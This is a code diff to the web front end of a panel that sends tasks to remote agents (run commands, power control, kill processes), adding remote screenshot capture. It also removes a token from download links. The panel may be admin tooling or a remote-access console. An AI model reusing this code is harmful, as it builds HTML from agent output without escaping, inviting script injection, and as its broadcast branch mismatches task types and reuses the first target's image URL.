@@ -50,6 +50,19 @@
             .fs-entry:nth-of-type(even) {
                 background-color: #eee;
             }
+            .modal-dialog:has(#screenshot-result) {
+                max-width: 100% !important;
+            }
+            #screenshot-result {
+                display: flex;
+                justify-content: center;
+                align-content: center;
+            }
+            .screenshot-img {
+                max-width: 70vw;
+                max-height: 70vh;
+                margin: auto;
+            }
         </style>
     </head>
     <body>
@@ -75,6 +88,7 @@
                             <option data-target="execute-command-form">${TASK_EXECUTE_CMD}</option>
                             <option data-target="power-control-form">${TASK_POWER_CONTROL}</option>
                             <option id="kill-proc-option" data-target="kill-proc-form">${TASK_KILL_PROC}</option>
+                            <option id="screenshot-option" data-target="screenshot-form">${TASK_SCREENSHOT}</option>
                         </select>
                         <div class="send-task-type-form" id="execute-command-form">
                             <label for="send-task-command">${COMMAND_FIELD}</label>
@@ -91,6 +105,8 @@
                             <select class="form-control" id="proc-select-option">
                                 <!-- Populated dynamically by JS -->
                             </select>
+                        </div>
+                        <div class="send-task-type-form" id="screenshot-form" style="display: none">
                         </div>
                     </form>
                     <footer class="modal-footer">
@@ -116,6 +132,9 @@
                             </pre>
                         </div>
                         <div id="broadcast-result">
+                        </div>
+                        <div id="screenshot-result">
+                            <!-- Img object will be added here -->
                         </div>
                     </div>
                     <footer class="modal-footer">
@@ -379,7 +398,7 @@
                             $("#fs-alert").alert("close")
                             var link = document.createElement("a")
                             document.body.appendChild(link)
-                            link.href = url + "?token=" + Cookies.get("token")
+                            link.href = url
                             link.download = entry.data("path")
                             link.click()
                             document.body.removeChild(link)
@@ -513,13 +532,18 @@
                             cmd: $("#send-task-power-option")[0].selectedOptions[0].dataset.target
                         }
                         break;
+                    case "${TASK_SCREENSHOT}":
+                        payload = {
+                            type: "screenshot"
+                        }
+                        break;
                 }
                 $("#send-task-submit").text("${TASK_RESULT_WAIT}")
                 sendTaskXHR = submitTask(target, payload, function (result) {
                     if (!broadcast) {
-                        showTaskSendResult(result)
+                        showTaskSendResult(result, payload.type)
                     } else {
-                        showTaskBroadcastResult(result)
+                        showTaskBroadcastResult(result, payload.type)
                     }
                     $("#send-task-submit").text("${SEND_BTN}")
                 }, function(msg) {
@@ -545,9 +569,10 @@
                 }
             })
 
-            function showTaskSendResult(result) {
+            function showTaskSendResult(result, type) {
                 $("#broadcast-result").hide()
-                $("#single-result").show()
+                $("#screenshot-result").hide()
+                $("#single-result").hide()
 
                 if (result.error) {
                     $("#result-status-code").text("${STATUS_ERROR_SERVER}")
@@ -556,37 +581,75 @@
                     $("#result-status-code").text("${STATUS_ERROR_AGENT}")
                     $("#result-output").text(result.results[0].msg)
                 } else {
-                    $("#result-status-code").text(result.results[0].status_code)
-                    $("#result-output").text(result.results[0].output)
+                    switch (type) {
+                    case "execute_cmd":
+                        $("#result-modal").children(".modal-dialog").css("max-width", "500px")
+                        $("#single-result").show()
+                        $("#result-status-code").text(result.results[0].status_code)
+                        $("#result-output").text(result.results[0].output)
+                        break;
+                    case "screenshot":
+                        $("#result-modal").children(".modal-dialog").css("max-width", "100%")
+                        var imgurl = result.results[0].url
+                        $("#screenshot-result").children().remove()
+                        $("#screenshot-result").show()
+                        $("#screenshot-result").append('<a href="' + imgurl + '"><img class="screenshot-img" src="' + imgurl + '" /></a>')
+                    }
                 }
                 $(".modal").modal("hide")
                 $("#result-modal").modal("show")
             }
 
-            function showTaskBroadcastResult(result) {
+            function showTaskBroadcastResult(result, type) {
                 $("#broadcast-result").show()
                 $("#single-result").hide()
+                $("#screenshot-result").hide()
 
                 $("#broadcast-result").children().remove()
 
                 var res = result.results
                 for (var i = 0; i < res.length; i++) {
-                    var status
-                    var output
-                    if (res[i].error) {
-                        status = "${STATUS_ERROR_AGENT}"
-                        output = res[i].msg
-                    } else {
-                        status = res[i].status_code
-                        output = res[i].output
-                    }
+                    switch (type) {
+                    case "execute_task":
+                        $("#result-modal").children(".modal-dialog").css("max-width", "500px")
+                        var status
+                        var output
+                        if (res[i].error) {
+                            status = "${STATUS_ERROR_AGENT}"
+                            output = res[i].msg
+                        } else {
+                            status = res[i].status_code
+                            output = res[i].output
+                        }
 
-                    $("#broadcast-result").append('\
-                            <b>' + res[i].target + '</b>\
-                            <div>\
-                                Status: <span>' +  status + '</span>\
-                                <pre>' + output + '</pre>\
-                            </div>')
+                        $("#broadcast-result").append('\
+                                <b>' + res[i].target + '</b>\
+                                <div>\
+                                    Status: <span>' +  status + '</span>\
+                                    <pre>' + output + '</pre>\
+                                </div>')
+                        break;
+                    case "screenshot":
+                        $("#result-modal").children(".modal-dialog").css("max-width", "100%")
+                        var imgurl = result.results[0].url
+                        if (res[i].error) {
+                            status = "${STATUS_ERROR_AGENT}"
+                            output = res[i].msg
+                            $("#broadcast-result").append('\
+                                    <b>' + res[i].target + '</b>\
+                                    <div>\
+                                        Status: <span>' +  status + '</span>\
+                                        <pre>' + output + '</pre>\
+                                    </div>')
+                            return
+                        }
+                            
+                        $("#broadcast-result").append('\
+                                <b>' + res[i].target + '</b>\
+                                <div>\
+                                    <a href="' + imgurl + '"><img class="screenshot-img" src="' + imgurl + '" /></a>\
+                                </div>')
+                    }
                 }
                 $(".modal").modal("hide")
                 $("#result-modal").modal("show")
